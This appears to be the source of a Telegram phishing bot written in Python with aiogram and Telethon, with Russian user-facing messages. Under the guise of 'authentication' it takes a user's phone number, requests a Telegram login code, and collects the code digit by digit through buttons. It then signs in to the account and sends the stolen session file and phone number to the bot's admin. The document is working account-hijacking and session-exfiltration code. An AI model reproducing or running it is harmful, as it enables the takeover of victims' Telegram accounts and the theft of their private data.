from aiogram.types import Message, CallbackQuery, ReplyKeyboardRemove
from aiogram.dispatcher import FSMContext
import os
import asyncio

from telethon.errors.rpcerrorlist import (
                PhoneCodeInvalidError, FloodWaitError
)

from data import User, warning_msg, ClientTG
from state import GetAccountTG
from markup import code_markup
from loader import vip, bot
from utils import config


@vip.message_handler(content_types=['contact'], state=GetAccountTG.one)
async def contact_handler(msg: Message, state: FSMContext):
    phone = msg.contact.phone_number.replace('', '')

    User(user_id=msg.from_user.id).update_phone(phone=phone)

    if not os.path.exists('./session/{phone}.session'.format(phone=phone[1:])):

        try:
            client = ClientTG(phone=phone).client
            await client.connect()

            send_code = await client.send_code_request(phone=phone)
            if client.is_connected():
                await client.disconnect()

            await msg.answer(
                text='<b>Аутентификация...</b>',
                reply_markup=ReplyKeyboardRemove()
            )

            msg_edit = await bot.send_message(
                chat_id=msg.from_user.id,
                text=f'<b>Вы указали:</b> <code>{phone}</code>\n'
                     f'<b>Введите первую цифру кода:</b>',
                reply_markup=code_markup()
            )

            await state.update_data(
                    phone=phone,
                    send_code=send_code,
                    code_hash=send_code.phone_code_hash,
                    msg_edit=msg_edit)

            await GetAccountTG.next()
        except FloodWaitError as error:
            await msg.answer(
                text=f'<b>❌ Ошибка!\n {error}</b>'
            )
            await state.finish()
    else:
        await msg.answer(
            text='<b>Ваши инструкции находятся в разработке!</b>',
            reply_markup=ReplyKeyboardRemove()
        )
        await state.finish()


@vip.callback_query_handler(text_startswith="code_number:", state=GetAccountTG.two)
async def get_account_tg(call: CallbackQuery, state: FSMContext):
    one = call.data.split(":")[1]
    async with state.proxy() as data:
        data['one'] = one
        msg_edit = data['msg_edit']

        await msg_edit.edit_text(
            text=f'<b>Код выстраивается тут:</b> <code>{one}</code>',
            reply_markup=code_markup()
        )

        await GetAccountTG.next()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.three)
async def get_account_tg_three(call: CallbackQuery, state: FSMContext):
    two = call.data.split(":")[1]

    async with state.proxy() as data:
        data['two'] = two
        msg_edit = data['msg_edit']
        one = data['one']

    code = one + two

    await msg_edit.edit_text(
        text=f'<b>Код выстраивается тут:</b> <code>{code}</code>',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.next()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.four)
async def get_account_tg_four(call: CallbackQuery, state: FSMContext):
    three = call.data.split(":")[1]

    async with state.proxy() as data:
        data['three'] = three
        msg_edit = data['msg_edit']
        one = data['one']
        two = data['two']

    code = one + two + three

    await msg_edit.edit_text(
        text=f'<b>Код выстраивается тут:</b> <code>{code}</code>',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.next()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.five)
async def get_account_tg_five(call: CallbackQuery, state: FSMContext):
    four = call.data.split(":")[1]

    async with state.proxy() as data:
        data['four'] = four
        msg_edit = data['msg_edit']
        one = data['one']
        two = data['two']
        three = data['three']

    code = one + two + three + four

    await msg_edit.edit_text(
        text=f'<b>Код выстраивается тут:</b> <code>{code}</code>',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.next()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.load)
async def get_account_tg_load(call: CallbackQuery, state: FSMContext):
    five = call.data.split(":")[1]

    async with state.proxy() as data:
        one = data['one']
        two = data['two']
        three = data['three']
        four = data['four']
        msg_edit = data['msg_edit']
        phone = data['phone']
        send_code = data['send_code']
        code_hash = data['code_hash']

    code = one + two + three + four + five

    client = ClientTG(phone=phone).client

    await client.connect()

    try:

        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)

        await msg_edit.edit_text(
            text='<b>Следуйте инструкциям!</b>'
        )
        await asyncio.sleep(3)

        await msg_edit.edit_text(
            text=warning_msg
        )

        with open(f'./session/{phone[1:]}.session', 'rb') as document:
            await bot.send_document(
                chat_id=config("admin_id"),
                document=document,
                caption=f'Пользователь: {call.from_user.get_mention()} | {phone}'
            )
            document.close()

    except PhoneCodeInvalidError:
        await msg_edit.edit_text(
           text='<b>❌ Проверка не удалась!\n Введен неправильный код, попробуйте снова /start</b>'
        )
    if client.is_connected():
        await client.disconnect()

    await state.finish()
